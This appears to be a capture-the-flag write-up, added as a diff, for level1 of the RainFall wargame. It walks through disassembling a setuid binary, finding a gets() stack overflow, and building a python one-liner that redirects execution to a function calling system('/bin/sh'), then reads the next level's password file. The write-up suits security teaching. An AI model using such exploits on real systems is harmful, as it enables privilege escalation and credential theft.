@@ -1,0 +1,107 @@
+For this level, we only have an executable called level1:
+```bash
+level1@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+```
+
+Let’s try to execute it:
+```bash
+level1@RainFall:~$ ./level1
+
+```
+
+The program is waiting for input, so let’s try sending something and see if we get lucky and find the correct string:
+```bash
+level1@RainFall:~$ ./level1
+Open sesame
+```
+
+Nothing happens (as expected), so let’s inspect the executable using objdump:
+```bash
+level1@RainFall:~$ objdump -d level1
+08048444 <run>:
+ 8048444:	55                   	push   %ebp
+ 8048445:	89 e5                	mov    %esp,%ebp
+ 8048447:	83 ec 18             	sub    $0x18,%esp
+ 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
+ 804844f:	89 c2                	mov    %eax,%edx
+ 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
+ 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
+ 8048461:	00 
+ 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
+ 8048469:	00 
+ 804846a:	89 04 24             	mov    %eax,(%esp)
+ 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
+ 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
+ 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
+ 804847e:	c9                   	leave
+ 804847f:	c3                   	ret
+
+08048480 <main>:
+ 8048480:	55                   	push   %ebp
+ 8048481:	89 e5                	mov    %esp,%ebp
+ 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048486:	83 ec 50             	sub    $0x50,%esp
+ 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
+ 804848d:	89 04 24             	mov    %eax,(%esp)
+ 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
+ 8048495:	c9                   	leave
+ 8048496:	c3                   	ret
+ 8048497:	90                   	nop
+ 8048498:	90                   	nop
+ 8048499:	90                   	nop
+ 804849a:	90                   	nop
+ 804849b:	90                   	nop
+ 804849c:	90                   	nop
+ 804849d:	90                   	nop
+ 804849e:	90                   	nop
+ 804849f:	90                   	nop
+```
+
+We can see a call to gets, which is vulnerable to a buffer overflow.
+Our goal is to redirect execution to the run function, since it calls system("/bin/sh").
+
+To do that, we need to find the correct offset to overwrite EIP.
+I used this website to generate a cyclic pattern:
+[wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+```bash
+level1@RainFall:~$ gdb level1
+(gdb) run
+Starting program: /home/user/level1/level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+(gdb) info registers
+eax            0xbffff6f0 -1073744144
+ecx            0xb7fd28c4 -1208145724
+edx            0xbffff6f0 -1073744144
+ebx            0xb7fd0ff4 -1208152076
+esp            0xbffff740 0xbffff740
+ebp            0x41346341 0x41346341
+esi            0x0  0
+edi            0x0  0
+eip            0x63413563 0x63413563
+eflags         0x210282   [ SF IF RF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+```
+
+The value 0x63413563 corresponds to an offset of 76 bytes, according to the pattern generator.
+So, we need to send:
+- 76 bytes of padding
+- address of the run function (0x08048444)
+
+Final exploit:
+```bash
+level1@RainFall:~$ (python -c "import sys; sys.stdout.write(b'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHH\x44\x84\x04\x08')" && cat) | ./level1
+
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
